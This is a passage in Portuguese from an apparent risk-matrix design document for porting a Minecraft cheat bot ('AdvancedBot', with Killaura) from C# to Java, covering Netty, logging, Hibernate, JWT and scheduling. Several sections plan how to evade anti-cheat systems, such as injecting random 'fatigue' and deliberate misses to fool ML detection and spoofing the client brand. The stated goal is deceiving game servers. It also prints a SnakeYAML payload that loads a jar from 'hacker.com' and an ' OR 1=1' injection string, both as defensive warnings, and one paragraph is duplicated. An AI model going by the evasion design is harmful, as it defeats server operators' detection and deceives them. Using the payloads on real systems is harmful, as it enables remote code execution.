**Ação**: Todo o pipeline de Logging deve usar `AsyncLogger` apoiado no `LMAX Disruptor` (RingBuffer). A Thread do Bot joga a string pro RingBuffer em nanossegundos e volta pro trabalho, enquanto uma thread background se encarrega de fazer a IO lenta no disco/terminal.

---

## 26. Apêndice T: A Dependência do Sistema de Relógio (NanoTime)

Muitas IAs no C# usavam `Environment.TickCount` (Que tem uma precisão terrível de 15.6ms no Windows). 

### 26.1 O Bug do Timer Duplo
Se o Bot tentar atacar a cada 50ms, e usar `System.currentTimeMillis()`, o teste `agora - ultimoAtaque > 50` pode ser verdadeiro no milissegundo 48 ou no milissegundo 62.
No Java, `System.nanoTime()` não mede o tempo real, ele mede o tempo da CPU desde o boot (Monotonic Clock).
**O Risco**: Se o desenvolvedor Java tentar salvar `System.nanoTime()` no banco de dados para calcular quanto tempo a conta VIP do usuário ainda dura, isso falhará tragicamente se o servidor reiniciar (Pois o contador volta pra zero).
**Ação**: `nanoTime` é estritamente para delays do Killaura. `currentTimeMillis` é estritamente para tempo absoluto. Não confunda os dois.

---

## 27. Apêndice U: Riscos de Dessincronização de Mundo (Chunk Loading)

O `WorldManager` precisa gerenciar milhares de Chunks (Matrizes 16x256x16).

### 27.1 O Risco da Descarregamento Prematuro
O servidor envia `0x21 Chunk Data` e o pacote `0x21 Chunk Data (Unload)`.
No C#, às vezes o bot descarregava um Chunk da memória RAM, mas o AStar ainda estava rodando na thread paralela tentando ler aquele Chunk, causando `NullReferenceException`.
**Ação**: Implementar o padrão `Copy-On-Write` (Ou RWLock). Quando o servidor pedir para descarregar o Chunk `(0,0)`, o Java marca ele como "Zombie" (Tombstone). A Thread principal não o enxerga mais, mas a memória física dele continua lá até a Thread do AStar terminar de usá-lo. Só então o ZGC coleta.

### 27.2 O Risco do Array Unidimensional
Os blocos do Minecraft (IDs) devem ser armazenados em um array unidimensional `short[] blocks = new short[65536]` ao invés de um array 3D `short[][][]`.
No C#, a inicialização de array multidimensional era barata. No Java, um array 3D cria 1 array mestre, que aponta para 16 arrays, que apontam para 256 arrays, gerando uma quantidade massiva de ponteiros (Overhead de Headers de Objeto).
**Ação**: Matemática de achatamento obrigatória: `index = y << 8 | z << 4 | x`. Isso salvará literalmente Gigabytes de RAM.

---

## 28. Apêndice V: Risco de Cross-Version Compatibility (Protocol Hacks)

Os usuários do Bot querem rodar na versão 1.8.8, mas também na 1.12.2 e 1.16.5.
No C#, a equipe tentou criar "IFs" espalhados pelo código inteiro (`if (version == 1.12.2) { ... }`), o que transformou o projeto em um monstro inmantenível.

### 28.1 A Armadilha de Re-inventar o ViaVersion
**O Risco**: Tentar fazer o Netty ler as diferenças de blocos entre a versão 1.8 e 1.16 nativamente no motor central destruirá a arquitetura Hexagonal.
**Ação**: O Domínio do Bot (`WorldManager`, `AStar`) conversará APENAS no protocolo interno Universal (1.8 adaptado). Qualquer versão superior deverá usar o conceito de Protocol Translators (Pipeline Handlers no Netty que traduzem os IDs dos blocos novos para os velhos em tempo real antes da IA ver).

---

## 29. Apêndice W: Bibliotecas de Logging e Risco de Log Forging

No C#, usávamos o `NLog`. Em Java, a transição para `SLF4J` com `Logback` (ou `Log4j2`) embute riscos de segurança cibernética (Log Forging e Log4Shell).

### 29.1 Injeção de Caracteres Especiais no Log
O servidor manda pacotes de Chat para o Bot. O Bot imprime o pacote no Console.
**O Risco**: Se um jogador malicioso no servidor mandar no chat: `\n\n[ADMIN] O bot foi desligado.`, e o Java imprimir isso cru no console, o usuário do Bot achará que o bot foi desativado. Em casos piores (como a vulnerabilidade JNDI do Log4Shell), o chat do jogo poderia hackear a VPS rodando o Java.
**Ação**: O Spring Boot (versão `3.2.x+`) já possui mitigação nativa para o Log4Shell. Porém, para Log Forging visual, os logs do bot devem usar o filtro de sanitização do Logback `%replace(%msg){'[\r\n]', ''}`. Qualquer nova linha injetada pelo servidor será removida antes de aparecer na tela do usuário VIP.

---

## 30. Apêndice X: Injeção de SQL e ORM (H2 / Hibernate)

O bot Java não usará arquivos `.txt` soltos para guardar dados de contas. Usaremos um banco de dados embarcado `H2` via `Spring Data JPA` (Hibernate).

### 30.1 O Risco do N+1 Selects
Se o Killaura quiser saber o nível VIP do jogador atual, ele acessa `bot.getAccount().getVipLevel()`.
No C#, as variáveis estavam todas na memória RAM instanciada.
No Java com Hibernate, se essa relação for `Lazy`, o bot fará uma query SQL `SELECT * FROM accounts WHERE...` a cada Tick de combate (20 vezes por segundo).
**O Risco**: Em 5 segundos, o banco H2 Travará (Deadlock) e o bot começará a perder pacotes (TimeOut).
**Ação**: Durante o Boot da sessão do Bot, todas as configurações atreladas ao usuário DEVEM ser cacheadas (Eager Loading em Memória via Records/DTOs). O domínio (Física/IAs) é estritamente proibido de injetar repositórios `@Repository` (Spring JPA). Eles operam apenas em cópias em memória da configuração.

### 30.2 Risco de HQL Injection
A UI Web do bot permitirá que o usuário pesquise logs de chats passados. Se a query for concatenada manualmente:
`String hql = "FROM ChatLog c WHERE c.message LIKE '%" + search + "%'";`
**O Risco**: SQL/HQL Injection. O usuário pode quebrar o banco local se digitar `' OR 1=1`.
**Ação**: Uso obrigatório do `CriteriaBuilder` ou de `Query Methods` do Spring Data (`findByMessageContaining(String msg)`).

---

## 31. Apêndice Y: Matriz de Permissões de Segurança (Spring Security)

Como o Bot migrou de "App Desktop" para "Servidor Web Headless", a segurança de API (JWT) é o que impede que o coleguinha do Discord controle o bot do usuário.

### 31.1 Risco de Token Leak
O Dashboard fará requests para o backend rodando no localhost usando um JWT (JSON Web Token). Se o JWT não expirar e for vazado, alguém assumirá controle eterno.
**Ação**: JWTs terão validade máxima de 15 minutos (Short-lived tokens). A aplicação deve usar um sistema de `Refresh Token` (Salvo num cookie HTTP-Only).

| Endpoint de API | Tipo de Usuário (Role) | Risco se exposto |
|---|---|---|
| `/api/bot/move` | `ROLE_USER` | Moderado. Faria o bot pular na lava. |
| `/api/bot/chat` | `ROLE_USER` | Crítico. Spammer usando a conta do dono (Mute permanente). |
| `/api/admin/kill` | `ROLE_ADMIN` | Fatídico. Desligaria a máquina virtual. Apenas chamadas do loopback (`127.0.0.1`) devem ser aceitas, nunca da rede externa `0.0.0.0`. |

---

## 32. Apêndice Z: O Risco de Detecção por Machine Learning (GrimAC V3)

No passado, os Anti-Cheats usavam matemática fixa (Se Yaw delta > 90, então Ban). Hoje, Anti-Cheats como o GrimAC e o Polar usam Machine Learning (Redes Neurais) treinadas com milhões de amostras de jogadores reais.

### 32.1 A "Planificação" do Comportamento do Bot
Se escrevermos as IAs do Java de maneira muito limpa e previsível (Ex: O Killaura sempre vira a cabeça em exatos 3 Ticks e ataca), o modelo estatístico do servidor perceberá que essa conta "Não tem variância humana" (0% de erro de mira).
**O Risco**: A conta não é banida na hora. O servidor acumula dados por 3 dias e faz uma Wave Ban na calada da noite, banindo 5.000 clientes VIPs do nosso bot de uma vez.
**Ação**: Toda IA de movimento e combate deve ser programada com a injeção do "Fator de Cansaço" (Fatigue Pattern). À medida que a IA roda por horas contínuas, os tempos de reação devem piorar em alguns milissegundos aleatórios, a mira deve "errar" um hit propositalmente a cada 100 hits, e o AStar deve tropeçar de vez em quando. Perfeição, no Minecraft moderno, é a prova cabal de que você é um robô.

---

## 33. Apêndice AA: Matriz de Trade-offs (O Que Vamos Perder)

A migração não é só ganhar. Ao sair do ecossistema C# / Windows nativo e ir para o Java / Multiplataforma, a equipe concorda em perder certas facilidades:

| Feature C# Legada | O Que Acontecerá no Java | Motivo do Trade-off |
|---|---|---|
| **Consumo de 15MB de RAM** | O Java consumirá no mínimo **250MB** de RAM por bot. | A JVM precisa de espaço pro JIT Compiler e Garbage Collector. O preço da estabilidade é a memória. |
| **Injeção via DLL (Hooking)** | O Bot Java não conseguirá ler a RAM do cliente original (Forge/Lunar). | Java roda em Sandbox de memória. Para ler memória de outro processo, precisaríamos de JNI em C++, o que mataria a portabilidade pro Linux. O bot será 100% "Protocol-Based". |
| **Interface WPF (DirectX)** | A interface será Web (React) servida via HTTP no localhost. | WPF era amarrado ao Windows. Migrar pro Electron/Web permite que usuários operem o bot direto pelo celular acessando o IP do painel. |

---

## 34. Apêndice AB: Falhas de Compilação Cruzada (Cross-Compilation Risks)

O C# legava a compilação ao MSBuild, o que garantia que o código gerado funcionaria no CLR do Windows. Migrar para Java traz a promessa do "Write Once, Run Anywhere", mas o uso de bibliotecas de terceiros mal desenhadas pode quebrar isso.

### 34.1 O Problema do GraalVM Native Image
Muitos desenvolvedores modernos tentarão compilar o bot usando o GraalVM Native Image para reduzir o consumo de RAM de 250MB para 50MB (Criando um executável nativo `.exe` ou um binário ELF sem precisar da JVM).
**O Risco**: A compilação Ahead-Of-Time (AOT) odeia Reflection. O bot legava reflexões pesadas no EventBus e na inicialização de Agentes. Se tentarmos usar o GraalVM Native sem a configuração massiva de `reflect-config.json`, o executável compilará perfeitamente, mas no momento em que alguém logar no bot, ele crashará com `ClassNotFoundException` instantaneamente.
**Ação**: A meta inicial de arquitetura é o uso de **JIT (HotSpot JVM)**. A tentativa de AOT compilation fica estritamente banida da branch `main` até que a cobertura de testes atinja 100% nas rotas de reflexão e todos os DTOs do Netty estejam serializados manualmente (sem dependência pesada de reflexão do Gson).

---

## 35. Apêndice AC: O Risco de Agendamento (Quartz vs Thread.Sleep)

O Bot original tinha funções como "Auto-Restart a cada 24 horas" ou "Anunciar no chat a cada 5 minutos". No C#, isso era feito jogando uma Task no fundo com um gigantesco `Task.Delay(300000)`.

### 35.1 A Fuga de Threads em Espera (Sleeping Thread Leak)
No Java, se um usuário tiver 20 bots abertos na mesma JVM, e cada bot tiver 5 "Auto-Announcers" rodando com `Thread.sleep()`, teremos 100 threads travadas na memória do S.O. fazendo absolutamente nada, apenas ocupando o limite de Threads do Linux (`ulimit -u`).
**O Risco**: Eventualmente o S.O. mata a JVM por "Out of PIDs" ou "Cannot create new native thread".
**Ação**: Todo o agendamento de tarefas longas deve passar pelo **ScheduledExecutorService** (com um pool fixo de 2 threads para o sistema inteiro) ou usar a anotação `@Scheduled` do Spring. Nunca criar uma nova thread só para usar `sleep`.

---

## 36. Apêndice AD: Tolerância a Falhas na API WebFlux

O painel Web de gerenciamento dos bots faz dezenas de requisições GET para ler o inventário, a vida e a fome do Bot (Polling). No C#, isso era feito via Named Pipes locais. No Java, usaremos HTTP REST (WebFlux).

### 36.1 O Risco da Fila de Requisições Entupida (Backpressure)
No Spring WebFlux (Reactor), a arquitetura é baseada em `EventLoop`. Se um endpoint for bloqueante (Ex: Lendo a configuração do disco de forma síncrona), a Thread do Netty HTTP travará.
Se 5.000 bots estiverem enviando telemetria para o painel Master simultaneamente, e as threads do Reactor travarem, a API retornará `503 Service Unavailable`. Pior: Os clientes HTTP ficarão pendurados (Socket Timeout), causando efeito dominó no servidor.
**Ação**: Todo repositório, cliente HTTP e lógica de disco do Bot deve retornar estritamente `Mono<T>` ou `Flux<T>`. O uso de `.block()` é proibido em qualquer camada acima dos repositórios. Além disso, devemos ativar o Spring BlockHound nos testes automatizados.
```java
// BlockHound detectará se algum desenvolvedor usar I/O bloqueante no EventLoop do Reactor.
@BeforeAll
static void setup() {
    BlockHound.install();
}
```

---

## 37. Apêndice AE: Integração Discord e Rate Limits

O C# possuía um módulo de `Discord Webhooks` e `Discord Rich Presence` (RPC) para exibir o status do bot no perfil do jogador.

### 37.1 O Risco de Rate Limiting (HTTP 429)
O Discord é muito estrito com spam. O Bot C# frequentemente sofria `HTTP 429 Too Many Requests` porque tentava atualizar a tela de "Jogando..." toda vez que o bot andava 1 bloco no Minecraft.
**O Risco da Migração Java**: Se importarmos a biblioteca Java de Discord RPC (`DiscordIPC`) e ligarmos direto no EventBus do Bot, o Java fará requests na velocidade do Tick do Minecraft (20 TPS). O IP do usuário será banido da API do Discord temporariamente (Cloudflare Ban).
**Ação**: O Listener do Discord RPC no Java DEVE implementar um `Debouncer` ou `RateLimiter` interno (Guava ou Resilience4j). As atualizações do Discord só podem ocorrer no máximo a cada 15 segundos.
```java
// Roteamento seguro com Rate Limiter
RateLimiter rpcLimiter = RateLimiter.create(0.06); // 1 request a cada ~16 segundos

@Subscribe
public void onBotStatusChange(StatusEvent e) {
    if (rpcLimiter.tryAcquire()) {
        discordClient.updateActivity(e.getDetails());
    }
}
```

---

## 38. Apêndice AF: O Risco de Conexões Fantasmas (Half-Open Sockets)

O protocolo TCP não garante que você será avisado se o servidor do outro lado explodir. Se o servidor de Minecraft travar (Hard Crash), o sistema operacional do servidor pode não enviar o pacote `FIN` ou `RST`.

### 38.1 A Morte Silenciosa da UI
Se o Netty no Java não for configurado com timeouts rigorosos, a conexão TCP ficará aberta no estado `ESTABLISHED`. O Bot continuará existindo no painel (Dashboard), mas nunca mais enviará um pacote e nem receberá. O usuário achará que o bot está vivo, mas ele é um fantasma.
**O Risco**: Como o Bot tem auto-reconnect, ele só tentaria reconectar se soubesse que caiu. Se ele ficar como fantasma, o Auto-Reconnect não atua. O jogador perde horas de *Farm* no servidor.
**Ação**: A Pipeline do Netty deve ter o `IdleStateHandler` injetado *antes* do Decoder.
```java
// Se não lermos nada do servidor por 30 segundos, força o throw de ReadTimeoutException
pipeline.addLast("idleStateHandler", new IdleStateHandler(30, 0, 0));
pipeline.addLast("readTimeoutHandler", new ReadTimeoutHandler(35));
```
O catch dessa exception ativará imediatamente o sistema de Reconnect.

---

## 39. Apêndice AG: Riscos no Hot-Reloading de Scripts (GraalVM)

O AdvancedBot C# tinha a funcionalidade mágica de "Recarregar Script" em tempo real. O usuário salvava o arquivo Javascript e o bot automaticamente parava a thread, destruía o escopo antigo e injetava a lógica nova sem desconectar do servidor.

### 39.1 O Vazamento de Contexto (Context Leak)
No Java, implementaremos isso recriando o `Context` do GraalVM.
**O Risco**: O GraalVM compila o código JS para Cógido de Máquina usando o JIT (Truffle Framework). Se recriarmos o `Context` 50 vezes porque o usuário salvou o arquivo 50 vezes, a Metaspace (Memória onde as classes Java ficam) pode lotar, pois o Truffle gera classes anônimas dinamicamente para otimizar o JS. O bot sofrerá um `OutOfMemoryError: Metaspace`.
**Ação**: Todo `Context` do GraalVM DEVE ser fechado usando `context.close(true)`. Além disso, a JVM deve ser iniciada com um limite rígido de Metaspace `-XX:MaxMetaspaceSize=128m` para forçar o GC a limpar classes velhas do Truffle periodicamente.

### 39.2 O Risco do File Watcher (Inotify)
Para detectar que o arquivo JS mudou, usaremos `WatchService` (NIO). No Windows (C#), isso funcionava perfeitamente com eventos. No Linux (Java), se o painel Pterodactyl estiver usando um volume Docker mapeado em NFS (Network File System), o evento de `ENTRY_MODIFY` simplesmente não será disparado.
**Ação**: O módulo de `ScriptManager` deve ter um Fallback de Polling Hashing (Verificar o MD5 do arquivo a cada 5 segundos) caso o `WatchService` informe que a plataforma não suporta eventos de I/O em tempo real.

---

## 40. Apêndice AH: Riscos na Leitura de YML (SnakeYAML)

Muitas configurações legadas foram distribuídas em formatos `.yml`. O C# usava a biblioteca `YamlDotNet`. Em Java, o padrão absoluto é `SnakeYAML`.

### 40.1 O Risco da Execução de Código Remoto (RCE)
O `SnakeYAML` clássico possui uma funcionalidade perigosa: A habilidade de instanciar objetos arbitrários através da tag `!!`. Se um usuário baixar um script VIP que contém um arquivo `config.yml` malicioso:
```yaml
config: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://hacker.com/malware.jar"]]]]
```
**O Risco**: O Bot Java executará código remoto assim que tentar carregar as configurações de AutoArmor do YML, infectando a máquina do usuário.
**Ação**: É terminantemente PROIBIDO instanciar o `Yaml` do SnakeYAML de forma crua. Todos os parsers YML do bot DEVEM usar o `SafeConstructor` que bloqueia a instanciação de classes fora do escopo primitivo.
```java
// OBRIGATÓRIO NA ARQUITETURA
Yaml yaml = new Yaml(new SafeConstructor(new LoaderOptions()));
```

---

## 41. Apêndice AI: Riscos de Proxies Dinâmicos (CGLIB vs ByteBuddy)

O ecossistema Java moderno (Spring, Hibernate, Mockito) funciona quase inteiramente na base de Geração de Bytecode em Tempo de Execução (Proxies).

### 41.1 A Intercepção Mágica do Spring
Se uma classe `WorldManager` tiver um método anotado com `@Transactional` (ou qualquer AOP - Aspect Oriented Programming), o Spring não instanciará a classe real. Ele usará o `CGLIB` (ou `ByteBuddy`) para criar uma classe filha fantasma na memória da JVM que engloba a original.
**O Risco**: Se o desenvolvedor Java tentar chamar um método `private` ou `final` de dentro da própria classe proxy, a intercepção AOP falha silenciosamente (Self-Invocation Problem).
Além disso, se a classe interceptada for instanciada milhares de vezes, o CGLIB pode lotar a Metaspace (MetaSpace Leak) gerando OOM.
**Ação**: Classes de Domínio puro (O Core Hexagonal: `AStar`, `PhysicsEngine`, `MPPlayer`) **NÃO DEVEM SER GERENCIADAS PELO SPRING**. Elas devem ser instanciadas via `new` em um padrão Factory. O Spring só deve gerenciar os "Ports" e "Adapters" (As bordas do hexágono).

---

## 42. Apêndice AJ: Riscos do Scheduler e Tick Drift

O Bot do Minecraft gira em torno do conceito sagrado do `Tick` (50 milissegundos).

### 42.1 O Tick Drift (A Deriva do Relógio)
Se o loop principal do Bot usar `Thread.sleep(50)`, isso está matematicamente errado.
O processamento do tick (Movimentação, Pathfinding, IAs) pode demorar 5ms.
Se processar (5ms) + Dormir (50ms) = O tick durará 55ms. Em 1 minuto, o bot estará 60 ticks "atrasado" em relação ao servidor.
**O Risco**: O servidor achará que o bot está voando (pois a gravidade está caindo mais devagar na simulação local) ou que o bot está com SpeedHack reverso.
**Ação**: O `TickOrchestrator` deve calcular a Deriva (Drift).
```java
long nextTickTime = System.currentTimeMillis() + 50;
processTick(); // Demora 5ms
long sleepTime = nextTickTime - System.currentTimeMillis();
if (sleepTime > 0) {
    Thread.sleep(sleepTime); // Dorme apenas 45ms
}
```
O tempo de "Sleep" DEVE ser dinâmico para garantir estritos 20 TPS (Ticks Per Second).

---

## 43. Apêndice AK: Risco de Entropia de IPs (BungeeCord Forwarding)

Os servidores Minecraft piratas usam o BungeeCord (Ou Velocity) para unir vários mini-servidores em uma rede só. 
O servidor real no qual o Bot entra geralmente está escondido na porta `25566`, enquanto o proxy (Bungee) atende na `25565`.

### 43.1 O Bug do Handshake Falsificado (IP Forwarding)
Para que o servidor `25566` saiba o IP real do Bot, o BungeeCord injeta o IP do Bot e o Profile UUID no final da String de endereço durante o pacote de `Handshake (0x00)`.
**O Risco**: Se o Bot tentar conectar diretamente à porta `25566` ignorando o BungeeCord, o servidor original vai rejeitá-lo (Pois ele exige o Forwarding). No C#, alguns usuários tentavam abusar disso para bugar o plugin de login (`AuthMe`).
**Ação**: O bot Java não tem permissão para falsificar pacotes de Forwarding. O pacote de Handshake (`HandshakePacket`) deve rejeitar Strings de Hostname maiores que 255 caracteres para evitar Buffer Overflows, e o bot deve sempre se conectar à porta oficial, deixando que o proxy redirecione a rede organicamente.

---

## 44. Apêndice AL: Riscos com Módulos Legados (Addons em C#)

O AdvancedBot original possuía uma API para plugins (Addons) escritos em C# que os usuários criavam para adicionar comportamentos complexos (Ex: Um Auto-Miner de diamante).
O ecossistema girava em torno de DLLs (Assemblies).

### 44.1 O Enterro dos Addons C#
**O Risco**: Usuários VIPs que escreveram milhares de linhas em C# tentarão exigir que o bot Java carregue as DLLs C# antigas através de pontes bizarras (Ex: JNI ou gRPC).
Se a equipe Java ceder e implementar uma ponte gRPC para rodar DLLs C# lado a lado com a JVM, teremos um pesadelo de latência. Um Addon de Killaura que tem que enviar a posição do alvo via Socket local (gRPC) até a DLL C# atrasará o Tick em 10ms.
**Ação**: A decisão arquitetural é **Corte Seco (Hard Deprecation)**. Nenhuma retrocompatibilidade será oferecida para Addons compilados.
A nova API de plugins será escrita nativamente em Java (Arquitetura de Jars Modulares) ou via GraalVM (JavaScript/Python) para scripts rápidos. A dor dos usuários perderem seus Addons é imensamente menor do que a dor de manter um Frankenstein bilingue (Java + C#).

---

## 45. Apêndice AM: Risco de Detecção por Ping Falso (Ping Spoofing)

O servidor frequentemente envia um pacote `0x00 KeepAlive` contendo um número aleatório, e o cliente precisa devolver esse exato número em um pacote `0x00 KeepAlive` de resposta. A diferença de tempo entre o envio e o recebimento é o "Ping" (Latência) do jogador.

### 45.1 O Atraso Artificial (Ping Spoofing)
Muitos bots de PvP tentam atrasar o pacote de KeepAlive para simular que o jogador está lagado (com ping de 300ms), o que buga o cálculo de Reach do servidor (permitindo bater de mais longe).
**O Risco**: Se a thread do Netty no Java atrasar o KeepAlive acidentalmente (por causa de um Garbage Collection grande), o Anti-Cheat achará que o bot está fazendo Ping Spoofing proposital. Pior ainda, se o servidor rodar um Anti-Cheat avançado (Vulcan), ele fará testes de Transação (`0x0F Confirm Transaction`). Se o Ping do KeepAlive for 300ms, mas o Ping da Transação for 15ms, o Vulcan banirá o bot por `Timer/PingSpoof`.
**Ação**: A resposta ao KeepAlive (`KeepAliveEvent`) DEVE ser tratada com prioridade máxima (`@Order(Priority.HIGHEST)`) e devolvida IMEDIATAMENTE pela thread de rede. Nunca atrase a resposta de relógios do servidor.

---

## 46. Apêndice AN: Risco de Vazamento de IP via Skin Server (DNS Leaks)

Para que o bot Premium entre no servidor, ele deve buscar o perfil da Mojang.
Muitos usuários de Bot usam proxies (SOCKS5/HTTP) para esconder seu IP real e evitar que sua casa sofra um ataque DDoS por admins de servidores inimigos.

### 46.1 O Vazamento do DNS Java
No Java, mesmo se você configurar `System.setProperty("socksProxyHost", "ip")`, a resolução de DNS (Transformar `authserver.mojang.com` em um IP) muitas vezes é feita pela placa de rede local ANTES do tráfego passar pelo Proxy SOCKS.
**O Risco**: Se o admin do servidor usar um domínio falso para texturas de servidor (`resource-pack: http://hacker-logger.com/pack.zip`), o bot Java tentará resolver esse domínio com o DNS local. O admin do servidor verá o IP real da casa do usuário VIP nos logs do Cloudflare dele. O anonimato do SOCKS5 foi quebrado.
**Ação**: O Netty deve ser inicializado com um `Socks5ProxyHandler` que seja configurado explicitly com um `Socks5AddressEncoder.DEFAULT` que faça Remote DNS Resolution (O DNS é resolvido lá na máquina do Proxy, e não no computador do usuário).

---

## 47. Apêndice AO: Riscos de Compressão Dinâmica (Set Compression)

No Minecraft, o servidor pode decidir ligar a compressão de pacotes a qualquer momento durante o Handshake enviando o pacote `0x03 Set Compression`.

### 47.1 O Risco da Reconfiguração da Pipeline
No C#, a compressão era uma flag boolean simples. No Java (Netty), a compressão altera a topologia da Pipeline.
**O Risco**: Se o Netty não injetar o `ZlibDecoder` dinamicamente na posição exata da Pipeline, o próximo pacote chegará em bytes comprimidos e o Decoder de Pacotes tentará ler os bytes cruamente, resultando em `DecoderException: Bad Packet ID`.
**Ação**: A injeção do `ZlibDecoder` deve ocorrer no Netty `ChannelHandlerContext` na mesma exata thread do EventLoop. NUNCA faça o addLast da pipeline em uma thread paralela.

---

## 48. Apêndice AP: Bloqueio de IPs de Datacenter (ASN Blocks)

Como o bot Java foi arquitetado para ser "Headless", é provável que 90% dos usuários o rodem em VPS hospedadas na OVH, Hetzner, ou AWS.

### 48.1 Anti-VPN e ASN Blocking
Muitos servidores usam plugins como `AntiVPN` que bloqueiam ranges de IP associados a Data Centers (ASN).
**O Risco**: O usuário não vai saber que o servidor recusou a conexão por ASN. O servidor pirata simplesmente fecha a socket TCP (Sem enviar Kick Message). O bot entrará em loop de reconexão infinita achando que é instabilidade da rede.
**Ação**: O bot deve ter uma IA de diagnóstico de conexão. Se a socket cair 3 vezes consecutivas durante a fase de Handshake, o painel WebFlux deve exibir um alerta vermelho: "Possível bloqueio de Anti-VPN. Considere configurar um SOCKS5 residencial nas opções do bot."

---

## 49. Apêndice AQ: Detecção de Client Brand (FML/Forge)

O servidor envia um pacote de `Plugin Message (0x3F)` no canal `MC|Brand` para perguntar qual cliente o jogador está usando (ex: `vanilla`, `forge`, `lunarclient`).

### 49.1 O Risco de Não Responder
Se o bot ignorar esse pacote (achando que não é importante para andar e bater), os plugins de proteção do servidor (como o `GrimAC` ou `NoCheatPlus`) vão marcar o cliente como altamente suspeito.
**O Risco**: Alguns servidores bloqueiam a entrada se você não responder `vanilla`. Outros servidores (focados em Mods) bloqueiam a entrada se você NÃO responder `forge`.
**Ação**: O Bot Java deve ter um campo configurável na UI Web chamado "Client Brand Spoofing". O padrão deve ser responder `vanilla`, imitando o exato buffer de string que o cliente Notchian envia.

### 49.2 O Risco do FML Handshake (Forge Mod Loader)
Servidores com Mods (Modpacks) exigem um Handshake muito mais complexo que o Vanilla. Eles esperam receber uma lista de Mods instalados e seus Hashes no canal `FML|HS`.
Se o bot não tiver suporte a esse canal, ele tomará `Disconnect: Incomplete FML Handshake`.
Implementar o FML Handshake no Netty Java adicionará pelo menos 1 mês de complexidade ao projeto, sendo considerado um risco de prazo.
Servidores com Mods (Modpacks) exigem um Handshake muito mais complexo que o Vanilla. Eles esperam receber uma lista de Mods instalados e seus Hashes no canal `FML|HS`.
Se o bot não tiver suporte a esse canal, ele tomará `Disconnect: Incomplete FML Handshake`.
Implementar o FML Handshake no Netty Java adicionará pelo menos 1 mês de complexidade ao projeto, sendo considerado um risco de prazo.

---

## 50. Conclusão da Matriz de Riscos

O fracasso de uma reescrita geralmente ocorre porque a nova equipe subestima os motivos das "gambiarras" do código antigo. 
O **AdvancedBot 2.4.5** sobreviveu por tanto tempo não porque o seu código C# era belo, mas porque o desenvolvedor original passou 40.000 horas refinando a física para burlar Anti-Cheats específicos por tentativa e erro.

Se o time Java tratar este projeto como "apenas mais um sistema Web de banco de dados", o bot será um desastre funcional: andará pelas paredes, duplicará itens e levará banimento imediato.

A regra de ouro da migração, ancorada nesta matriz de riscos, é:
**"Na dúvida, copie as falhas e os limites matemáticos do Vanilla original (Float Casts, Endianness, BoundingBoxes). Nós não estamos construindo um Jogo novo, estamos construindo um Ator que engana o servidor do Jogo."**

Com o mapeamento de riscos e mitigação definidos, fechamos a trindade da Engenharia (Arquitetura, Testes, Riscos). O último documento necessário para a equipe de desenvolvimento avançar é o `10-Lacunas-da-Documentacao.md`, que unificará tudo o que ainda falta desvendar no código legado antes do primeiro commit Java.
